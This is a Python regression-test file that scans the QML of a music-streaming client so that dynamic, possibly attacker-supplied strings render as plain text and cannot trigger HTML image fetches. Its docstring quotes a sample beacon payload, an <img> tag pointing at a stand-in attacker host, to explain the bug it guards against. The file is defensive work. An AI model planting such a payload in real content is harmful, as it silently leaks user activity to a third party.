"""Regression guard: a zero-click image-beacon must never re-appear in the QML.

THE BUG WE ARE FENCING OFF
--------------------------
Qt's ``Text``/``Label`` default to ``textFormat: Text.AutoText``. AutoText sniffs
the bound string and, if it looks like HTML, parses it as *rich text*, at which
point an embedded ``<img src="https://attacker/beacon?id=...">`` is fetched the
instant the label paints. For a string an attacker controls (anything TIDAL serves
us: album/track/artist names, bios, durations, playlist titles, queue labels) that
is a zero-click outbound beacon leaking "this user viewed this item".

``StyledText`` and ``RichText`` parse HTML the same way; only ``PlainText`` is safe.

HOW THIS STAYS FIXED
--------------------
A denylist of "which bindings are remote" is fragile; an adversarial review showed
it leaks via bare component props, bracket access (``model['x']``), local aliases,
and ``RichText``. So the guard is STRUCTURAL, with ZERO false negatives by design:

* ``test_dynamic_text_is_plaintext``: in Main.qml (the TIDAL render surface) EVERY
  ``Text``/``Label`` whose ``text:`` is a *dynamic* (non-literal) expression must be
  ``PlainText`` (or a ``RemoteText``, or an audited rich-text spot). No
  remote-vs-local guess, so a brand-new remote binding can't beacon however it is
  bound. Pure string/char literals are exempt: they can't carry a remote string.
* ``test_richtext_is_only_the_deliberate_local_spots``: the StyledText/RichText set
  must equal exactly the audited ``DELIBERATE_RICHTEXT`` spots (all bind LOCAL data),
  closing the other two rich-text paths.
* ``RemoteText.qml`` is the ergonomic shared default for new remote strings; its own
  test pins ``PlainText``. The ``REMOTE_MARKERS`` below are now used only to flag a
  deliberate rich-text spot that *starts* binding remote data.

See ``ALGORITHM`` below for the exact detection rules.
"""

from __future__ import annotations

import re
from pathlib import Path

QML_DIR = Path(__file__).resolve().parent.parent / "tidaler" / "waves_ui" / "qml"

# Files in scope, and (per file) whether `model.`/`modelData.` denote *remote*
# (attacker-controllable TIDAL) data.
#
#   Main.qml         renders TIDAL search/library/queue/artist results, so its
#                    `model.`/`modelData.`/`artistData.`/`db.label` bindings are
#                    attacker-controllable → remote.
#   SettingsPage.qml renders only LOCAL data: the app's own settings schema
#                    (`modelData.label/.group/.desc/.help/.fields`, defined in our
#                    Python, never from TIDAL) and our own ffmpeg/updater status.
#                    So `model.`/`modelData.` there are NOT remote. It is still
#                    scanned so its deliberate StyledText spots stay deliberate and
#                    can't quietly start binding a TIDAL string.
TIDAL_DATA_FILES = {"Main.qml"}
LOCAL_ONLY_FILES = {"SettingsPage.qml"}
FILES = sorted(TIDAL_DATA_FILES | LOCAL_ONLY_FILES)

# Remote markers: substrings that, inside a `text:` binding *in a TIDAL_DATA_FILE*,
# mean the rendered string is (or may be) attacker-controllable. We match a DOTTED
# FIELD access on a remote root:
#   model.X         : a named field of a delegate row from a remote ListView model
#   modelData.X     : a named field of a delegate row from a remote Repeater model
#   artistData.X    : a field of the TIDAL artist name/bio object
#   db.label        : a DownloadButton label (carries a remote artist name)
#
# Why a *field* access and not the bare root? Every TIDAL row is a JS object whose
# strings are read by name (`model.title`, `modelData.duration`, …). The bare
# `modelData` / `modelData[0]` forms appear ONLY for local inline-literal arrays
# (the sort/quality ComboBox `["Sort: …"]`, the filter chips `[["all","All"], …]`)
# and would render `[object Object]` for a real TIDAL row, so requiring a dotted
# field both (a) catches every real remote string, including a field name we never
# enumerated like a future `model.someNewBlurb`, and (b) ignores the local literals.
# This is the zero-false-negative property: any NEW `<root>.<field>` trips the guard.
REMOTE_MARKERS = (
    re.compile(r"\bmodel\.[A-Za-z_]"),
    re.compile(r"\bmodelData\.[A-Za-z_]"),
    re.compile(r"\bartistData\.[A-Za-z_]"),
    re.compile(r"\bdb\.label\b"),
    # Component-indirection blind spot: AlbumBlock / TrackRow / ArtistLinks receive
    # remote TIDAL data through BARE-named required properties (e.g. `AlbumBlock {
    # title: model.title }`) and render the bare name (`Text { text: title }`). No
    # `model.`-rooted marker sees that, so match the bare remote-prop names too. The
    # `(?<![.\w])` lookbehind means `model.title` / `banner.title` don't double-match
    # and, crucially, a dotted/local `.title` is never picked up here.
    # NOTE: add any NEW bare remote-bearing component property to this list.
    re.compile(r"(?<![.\w])title\b"),
    re.compile(r"(?<![.\w])artistName\b"),
    re.compile(r"(?<![.\w])album\b"),
    re.compile(r"\bal\.suffix\b"),  # ArtistLinks suffix: fed `album` (remote) by TrackRow
)

SAFE_PLAINTEXT = "textFormat: Text.PlainText"

# Deliberate rich-text elements (StyledText/RichText ON PURPOSE: links/markup),
# keyed by (file, marker-slug). Each audited element carries an in-source marker
# comment on (or immediately above) its open line:
#     Text { // guard:deliberate-richtext <slug>
# so the anchor survives unrelated edits (line-number keys broke three times in one
# day of normal work). Each binds only LOCAL data (our bundled ffmpeg source list /
# updater repo / a string literal), never TIDAL, so a rendered `<a>`/`<img>` can't
# be attacker-influenced. The structural test exempts these from the PlainText
# requirement; the backstop test asserts that these (and ONLY these) are
# StyledText/RichText, and that none has started binding remote data. (StyledText
# AND RichText both parse HTML and auto-fetch <img>; AutoText is closed by the
# structural test. There are NO allowlisted *TIDAL* spots: every TIDAL string is
# PlainText/RemoteText, including the WaveMark/WelcomeBanner ASCII tiles, which are
# local glyphs but get PlainText so the rule needs no exceptions.)
DELIBERATE_RICHTEXT: set[tuple[str, str]] = {
    ("Main.qml", "ffmpeg-attribution"),  # FFmpeg source attribution link (appFfmpeg.status.*)
    ("Main.qml", "privacy-promise"),  # privacy-promise blurb (string literal w/ <font>)
    ("Main.qml", "download-nudge-body"),  # download-folder nudge body (string literal, <font>/<tt> code path)
    ("SettingsPage.qml", "ffmpeg-attribution"),  # FFmpeg attribution link (page.ff.status.*)
    ("SettingsPage.qml", "ffmpeg-attribution-managed"),  # same link, managed twin-tile layout
    ("SettingsPage.qml", "updater-releases-link"),  # updater "Releases & changelog" link (page.appUp.*)
}

# The in-source anchor for an audited rich-text element. Must sit on the element's
# open line or the line directly above it: proximity is what ties the audit to
# THIS element rather than to whatever later drifts onto some line number.
DELIBERATE_MARKER = re.compile(r"guard:deliberate-richtext\s+([A-Za-z0-9_-]+)")


# ===========================================================================
# ALGORITHM (prose)
# ---------------------------------------------------------------------------
# 1. ENUMERATE ELEMENTS. For each .qml file, find every element-open token:
#       (optional `contentItem:`/`delegate:` prefix is irrelevant: we just match
#        the type name) `Text {` or `Label {`, via a regex whose leading negative
#       lookbehind `(?<![A-Za-z0-9_.])` rejects `TextField`, `TextInput`,
#       `TextMetrics`, `TextArea`, and `Foo.Text` enum reads. `RemoteText {` is
#       matched separately and treated as INHERENTLY SAFE (it bakes in PlainText),
#       so it is never flagged.
#
# 2. CAPTURE THE BRACE SPAN. From each open `{`, walk forward counting `{`/`}`
#    depth (skipping string literals and // and /* */ comments) until depth returns
#    to 0. That `{...}` is the exact source of THAT element: inline one-liners,
#    multi-line bodies, and nested child braces alike, with no greedy over-capture.
#
# 3. EXTRACT THE ELEMENT'S OWN `text:` VALUE. Scan the span for a `text:` that is a
#    *direct* property of this element (at brace-depth 1 inside the body; never one
#    belonging to a nested child `{...}` or a `function(){}`). The value runs from
#    just after the colon to the matching terminator:
#       * if the value itself opens `{` (a multi-line JS block, e.g. the
#         queue-progress label at Main.qml:2133-2141) capture the whole
#         brace-balanced block;
#       * otherwise capture to the end of the logical statement (`;`, newline, or
#         the element's closing `}`) while respecting (), [], {} and string nesting
#         so a `;`/newline inside a string or argument list never truncates it.
#    If the element has NO own `text:` (e.g. a glyph button `text: "✕"` whose only
#    `model.qid` reference lives in a child `MouseArea.onClicked`), it is NOT
#    remote-bound. Scoping to the `text:` VALUE (not the whole block) is what
#    avoids that false positive.
#
# 4. CLASSIFY remote := (file is a TIDAL_DATA_FILE) AND (a REMOTE_MARKER matches the
#    extracted `text:` value). The marker matches the remote ROOT object, so a new
#    `model.<anything>` field is caught even though we never enumerated it.
#
# 5. CLASSIFY safe := the element span contains `textFormat: Text.PlainText`. This
#    works for both the inline form (`Text { textFormat: Text.PlainText; text: … }`)
#    and the multi-line form where `textFormat` sits on its own line either before
#    or after `text:` (we search the whole span, so order/placement is irrelevant;
#    e.g. the queue label at Main.qml:2132 declares PlainText one line ABOVE its
#    multi-line `text:` block, and the bio at 1732 declares it BELOW). RemoteText
#    elements are safe by construction (step 1).
#
# 6. ASSERT every dynamic element is safe, unless it carries a
#    `guard:deliberate-richtext <slug>` marker (open line or the line directly
#    above) whose (file, slug) is in DELIBERATE_RICHTEXT. Content-anchored, so
#    edits elsewhere in the file can't invalidate the audit (line-number keys
#    needed manual re-pinning after almost every edit above them).
#
# 7. FALSE-NEGATIVE BACKSTOP (separate test). Independently assert that the set of
#    StyledText/RichText elements is EXACTLY the marked-and-listed audited set
#    (an unmarked rich-text element fails, a marker missing from the allowlist
#    fails, an allowlisted slug with no rich-text element fails) and that none of
#    those deliberate spots has started binding a remote marker. So the moment
#    anyone adds a new `textFormat: Text.StyledText` (the only other way to get
#    rich text / auto-`<img>`) the guard fails until it is reviewed, marked and
#    listed. A third test polices the markers themselves (unique per file, always
#    attached to a Text/Label open, always listed). Combined with step 6 (which
#    forbids leaving a remote string on the AutoText default), the tests together
#    close every path to rendering attacker HTML.
# ===========================================================================

_SAFE_TYPE_OPEN = re.compile(r"(?<![A-Za-z0-9_.])RemoteText\s*\{")
_AUDIT_TYPE_OPEN = re.compile(r"(?<![A-Za-z0-9_.])(Text|Label)\s*\{")


def _brace_span(src: str, open_brace_idx: int) -> int:  # noqa: C901 (a deliberate char/brace scanner)
    """Index of the `}` closing the `{` at ``open_brace_idx`` (strings/comments skipped)."""
    depth = 0
    i, n = open_brace_idx, len(src)
    while i < n:
        c = src[i]
        if c in "\"'":
            q = c
            i += 1
            while i < n and src[i] != q:
                if src[i] == "\\":
                    i += 1
                i += 1
        elif c == "/" and i + 1 < n and src[i + 1] == "/":
            while i < n and src[i] != "\n":
                i += 1
        elif c == "/" and i + 1 < n and src[i + 1] == "*":
            i += 2
            while i + 1 < n and not (src[i] == "*" and src[i + 1] == "/"):
                i += 1
            i += 1
        elif c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return n - 1


def _read_value(span: str, j: int) -> str:  # noqa: C901 (a deliberate char scanner)
    """Read a property value starting just past its colon at index ``j``.

    A bare newline at paren/bracket depth 0 normally ends the statement, EXCEPT when
    the expression is continued by a `+` concatenation onto the next line (see
    ``_value_continues_past_newline``); otherwise a dynamic ``text:`` whose first line
    is a plain string literal (``text: "…" \\n + model.x``) would be read as a pure
    literal and skip the PlainText requirement."""
    n = len(span)
    while j < n and span[j] in " \t":
        j += 1
    start = j
    pdepth = 0
    last_sig = ""  # last non-whitespace char, for continuation detection
    while j < n:
        c = span[j]
        if c in "\"'":
            q = c
            j += 1
            while j < n and span[j] != q:
                if span[j] == "\\":
                    j += 1
                j += 1
            j += 1
            last_sig = q
            continue
        if c in "([{":
            pdepth += 1
            j += 1
            last_sig = c
            continue
        if c in ")]":
            pdepth -= 1
            j += 1
            last_sig = c
            continue
        if c == "}":
            if pdepth == 0:
                break
            pdepth -= 1
            j += 1
            last_sig = c
            continue
        if pdepth == 0 and c == ";":
            break
        if pdepth == 0 and c == "\n":
            if _value_continues_past_newline(span, j, last_sig):
                j += 1
                continue
            break
        if c not in " \t\r":
            last_sig = c
        j += 1
    return span[start:j]


def _value_continues_past_newline(span: str, nl_idx: int, last_sig: str) -> bool:
    """A `text:` binding continues onto the next line when the two lines are joined by
    a `+` concatenation: QML style puts the `+` either trailing (``"a" +``\\n``"b"``)
    or leading (``"a"``\\n``+ "b"``). Truncating at the first newline is the evasion
    that let a dynamic Text whose expression continued with ``+`` on the next line read
    as a pure literal and skip the PlainText requirement, so we look in both directions
    before treating the newline as a terminator.
    ``last_sig`` is the last significant (non-space) char seen before ``nl_idx``."""
    if last_sig == "+":
        return True
    k = nl_idx + 1
    n = len(span)
    while k < n and span[k] in " \t\r\n":
        k += 1
    return k < n and span[k] == "+"


def _find_own_prop_value(span: str, prop: str) -> str | None:  # noqa: C901 (a deliberate char scanner)
    """Value of this element's OWN ``<prop>:`` binding (direct property, at brace-depth
    1; never one belonging to a nested child or a ``function(){}``), or None."""
    n = len(span)
    plen = len(prop)
    i = 0
    depth = 0  # relative to span[0] == '{'
    while i < n:
        c = span[i]
        if c in "\"'":
            q = c
            i += 1
            while i < n and span[i] != q:
                if span[i] == "\\":
                    i += 1
                i += 1
            i += 1
            continue
        if c == "/" and i + 1 < n and span[i + 1] == "/":
            while i < n and span[i] != "\n":
                i += 1
            continue
        if c == "/" and i + 1 < n and span[i + 1] == "*":
            i += 2
            while i + 1 < n and not (span[i] == "*" and span[i + 1] == "/"):
                i += 1
            i += 2
            continue
        if c == "{":
            depth += 1
            i += 1
            continue
        if c == "}":
            depth -= 1
            i += 1
            continue
        if (
            depth == 1
            and span.startswith(prop, i)
            and re.match(re.escape(prop) + r"\s*:", span[i:])
            and (i == 0 or not (span[i - 1].isalnum() or span[i - 1] in "_."))
        ):
            j = i + plen
            while j < n and span[j] != ":":
                j += 1
            return _read_value(span, j + 1)
        i += 1
    return None


def _find_own_text_value(span: str) -> str | None:
    """Value of this element's OWN `text:` binding (direct property), or None."""
    return _find_own_prop_value(span, "text")


def _iter_audit_elements(src: str):
    """Yield (line_no, type_name, span, slug) for every Text/Label element open.

    RemoteText is skipped (inherently safe). line_no is the 1-based line of the
    element's open token (for diagnostics only); slug is the element's
    `guard:deliberate-richtext <slug>` marker (taken from the open line or the
    line directly above) or None. The allowlist keys on (file, slug), so it
    survives edits that merely shift line numbers.
    """
    lines = src.splitlines()
    for m in _AUDIT_TYPE_OPEN.finditer(src):
        open_idx = m.end() - 1
        end_idx = _brace_span(src, open_idx)
        span = src[open_idx : end_idx + 1]
        line_no = src.count("\n", 0, m.start()) + 1
        slug = None
        for ln in (line_no, line_no - 1):
            if 1 <= ln <= len(lines):
                mk = DELIBERATE_MARKER.search(lines[ln - 1])
                if mk:
                    slug = mk.group(1)
                    break
        yield line_no, m.group(1), span, slug


def _iter_remotetext_elements(src: str):
    """Yield (line_no, span) for every RemoteText element open. RemoteText bakes in
    PlainText, but an instantiation can re-declare `textFormat:`, so instances are
    scanned to catch one that re-enables rich text."""
    for m in _SAFE_TYPE_OPEN.finditer(src):
        open_idx = m.end() - 1
        end_idx = _brace_span(src, open_idx)
        span = src[open_idx : end_idx + 1]
        line_no = src.count("\n", 0, m.start()) + 1
        yield line_no, span


def _strip_string_literals(expr: str) -> str:
    """Blank out the contents of "..."/'...' literals so a marker only matches a
    code identifier, never a word that merely appears inside a quoted string (e.g.
    the literal "Search for an artist, album, or track" must not match `album`)."""
    out: list[str] = []
    i, n = 0, len(expr)
    while i < n:
        c = expr[i]
        if c in "\"'":
            q = c
            i += 1
            while i < n and expr[i] != q:
                if expr[i] == "\\":
                    i += 1
                i += 1
            i += 1  # skip the closing quote
            out.append(" ")  # placeholder, so neighbours don't fuse
        else:
            out.append(c)
            i += 1
    return "".join(out)


def _matches_remote(text_value: str) -> bool:
    code = _strip_string_literals(text_value)
    return any(p.search(code) for p in REMOTE_MARKERS)


def _is_literal_only(text_value: str) -> bool:
    """True if the text: value is a pure literal: string/char/number/operator only,
    no identifier (e.g. ``"✓"``, ``"ALBUM"``, ``"a" + "b"``). Such a value can never
    carry a remote string, so it needs no textFormat. Anything referencing an
    identifier (``model.title``, ``title``, ``model['x']``, ``alias``, ``Math.round``)
    is *dynamic* and must declare PlainText; no remote-vs-local guess required, which
    is what makes this structural rule free of the denylist's false negatives."""
    return re.search(r"[A-Za-z_]", _strip_string_literals(text_value)) is None


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------


def test_remotetext_component_is_plaintext():
    """The shared safe component itself must actually pin PlainText; otherwise
    every `RemoteText { … }` the guard trusts would be a beacon."""
    rt = (QML_DIR / "RemoteText.qml").read_text(encoding="utf-8")
    # Strip // and /* */ comments so the prose explanation (which names StyledText/
    # AutoText) doesn't fool the assertion: we care only about the actual code.
    code = re.sub(r"//[^\n]*", "", rt)
    code = re.sub(r"/\*.*?\*/", "", code, flags=re.DOTALL)
    assert SAFE_PLAINTEXT in code, "RemoteText.qml must set textFormat: Text.PlainText"
    # It must not also assign a rich-text format that would defeat the purpose.
    assert "Text.StyledText" not in code and "Text.AutoText" not in code


def test_remotetext_instances_do_not_reenable_richtext():
    """The guard trusts every `RemoteText { … }` as PlainText-by-construction and
    never flags it, but an instantiation can re-declare `textFormat:` and re-enable
    rich text (`RemoteText { textFormat: Text.StyledText; text: model.bio }` would beacon
    on TIDAL data). So any RemoteText instance that overrides `textFormat` to anything
    other than PlainText is a violation."""
    violations: list[str] = []
    for fname in FILES:
        src = (QML_DIR / fname).read_text(encoding="utf-8")
        for line_no, span in _iter_remotetext_elements(src):
            tf = _find_own_prop_value(span, "textFormat")
            if tf is None:
                continue  # inherits the component's PlainText: safe
            if tf.strip() != "Text.PlainText":
                violations.append(
                    f"{fname}:{line_no}: RemoteText overrides textFormat to "
                    f"{tf.strip()!r}: re-enables rich text (auto-<img>) on remote data"
                )
    assert (
        not violations
    ), "RemoteText instance(s) re-enabling rich text; drop the override or set " "Text.PlainText:\n" + "\n".join(
        violations
    )


def test_dynamic_text_is_plaintext():
    """STRUCTURAL guard (the real anti-regression rule). In Main.qml (the surface
    that renders TIDAL data) EVERY Text/Label whose ``text:`` is a dynamic
    (non-literal) expression must render as PlainText, be a RemoteText, or be one of
    the audited intentional-StyledText spots. No remote-vs-local guessing: any
    dynamic string, however it reaches ``text:`` (``model.x``, a bare component prop
    like ``title``/``duration``, ``model['x']`` bracket access, a local alias, a
    multi-line JS block), is forced off the rich-text-capable AutoText default. That
    closes the false negatives a marker denylist leaves open: a brand-new remote
    field can't beacon because it can't be dynamic-and-not-PlainText.

    Pure literals (``"✓"``, ``"ALBUM"``, ``"a" + "b"``) are exempt: they can never
    carry a remote string. SettingsPage.qml is not structurally scanned here (it
    renders only local app config, no TIDAL data); its rich-text path is still
    covered by the StyledText/RichText backstop test below.
    """
    violations: list[str] = []
    audited = 0
    for fname in sorted(TIDAL_DATA_FILES):
        src = (QML_DIR / fname).read_text(encoding="utf-8")
        for line_no, type_name, span, slug in _iter_audit_elements(src):
            tv = _find_own_text_value(span)
            if tv is None or _is_literal_only(tv):
                continue  # no own text:, or a pure literal: safe
            audited += 1
            if SAFE_PLAINTEXT in span:
                continue
            if slug is not None and (fname, slug) in DELIBERATE_RICHTEXT:
                continue  # intentional rich text, governed by the backstop test
            note = " (binds a remote marker!)" if _matches_remote(tv) else ""
            violations.append(
                f"{fname}:{line_no}: dynamic {type_name} is not textFormat: "
                f"Text.PlainText (and not RemoteText / not an audited rich-text spot)"
                f"{note}\n        text value: {tv.strip()[:80]!r}"
            )

    # Vacuous-pass tripwire: Main.qml binds dozens of dynamic labels; if this
    # collapses the scanner silently broke and would never catch a regression.
    assert audited >= 30, (
        f"only found {audited} dynamic Text/Label elements in Main.qml; the scanner " "is probably broken."
    )
    assert not violations, (
        "Dynamic strings rendered on the rich-text-capable AutoText default: a "
        "zero-click image-beacon could regress through any of these. Use RemoteText "
        "or add `textFormat: Text.PlainText` (or, for deliberate links, StyledText + "
        "a DELIBERATE_RICHTEXT entry):\n\n" + "\n".join(violations)
    )


def test_richtext_is_only_the_deliberate_local_spots():
    """Backstop on the OTHER rich-text paths. Both StyledText AND RichText parse
    HTML and auto-fetch `<img>`/`<a>`, so the set of StyledText/RichText elements
    (across BOTH files) must equal exactly the audited DELIBERATE_RICHTEXT spots,
    and none may bind a remote marker. A new StyledText/RichText anywhere (or a
    deliberate one that starts binding TIDAL data) fails until reviewed."""
    found: set[tuple[str, str]] = set()
    unmarked: list[str] = []
    leaked_remote: list[str] = []
    for fname in FILES:
        is_tidal = fname in TIDAL_DATA_FILES
        src = (QML_DIR / fname).read_text(encoding="utf-8")
        for line_no, _type, span, slug in _iter_audit_elements(src):
            if "textFormat: Text.StyledText" not in span and "textFormat: Text.RichText" not in span:
                continue
            if slug is None:
                unmarked.append(f"{fname}:{line_no}")
            else:
                found.add((fname, slug))
            tv = _find_own_text_value(span) or ""
            if is_tidal and _matches_remote(tv):
                leaked_remote.append(
                    f"{fname}:{line_no}: a StyledText/RichText now binds a remote marker: "
                    f"rich text on attacker data!\n        text value: {tv.strip()[:80]!r}"
                )

    unexpected = sorted(found - DELIBERATE_RICHTEXT) + [f"{loc} (no marker)" for loc in unmarked]
    missing = DELIBERATE_RICHTEXT - found
    assert not unexpected, (
        "StyledText/RichText element(s) outside the audited allowlist. They parse "
        "HTML (auto-fetch <img>/<a>). Confirm the source is LOCAL, add a\n"
        "`// guard:deliberate-richtext <slug>` marker on the element's open line, "
        "and list (file, slug) in DELIBERATE_RICHTEXT, or switch to "
        "PlainText/RemoteText:\n  " + "\n  ".join(str(u) for u in unexpected)
    )
    assert not missing, (
        "DELIBERATE_RICHTEXT references marker slugs with no matching "
        "StyledText/RichText element (marker removed, or element no longer rich "
        "text; re-point or remove): " + ", ".join(f"{f}#{s}" for f, s in sorted(missing))
    )
    assert not leaked_remote, "\n".join(leaked_remote)


def test_allowlist_still_points_at_elements():
    """Anti-rot on the markers themselves: every allowlisted (file, slug) must be
    carried by exactly ONE Text/Label element, and every marker comment in the
    source must be both attached to an element (open line or the line above; a
    drifting orphan comment can't silently vouch for something else) and listed
    in DELIBERATE_RICHTEXT."""
    problems: list[str] = []
    for fname in FILES:
        src = (QML_DIR / fname).read_text(encoding="utf-8")
        attached: list[str] = [slug for _ln, _t, _s, slug in _iter_audit_elements(src) if slug is not None]
        # Markers appearing anywhere in the file, attached or not.
        all_markers = DELIBERATE_MARKER.findall(src)
        for slug in all_markers:
            if (fname, slug) not in DELIBERATE_RICHTEXT:
                problems.append(f"{fname}#{slug}: marker in source but not in DELIBERATE_RICHTEXT")
        if len(all_markers) != len(set(all_markers)):
            problems.append(f"{fname}: duplicate marker slug(s): each must be unique per file")
        orphans = set(all_markers) - set(attached)
        problems.extend(
            f"{fname}#{slug}: marker is not on (or directly above) a Text/Label open" for slug in sorted(orphans)
        )
    assert not problems, "Marker/allowlist drift:\n" + "\n".join(problems)
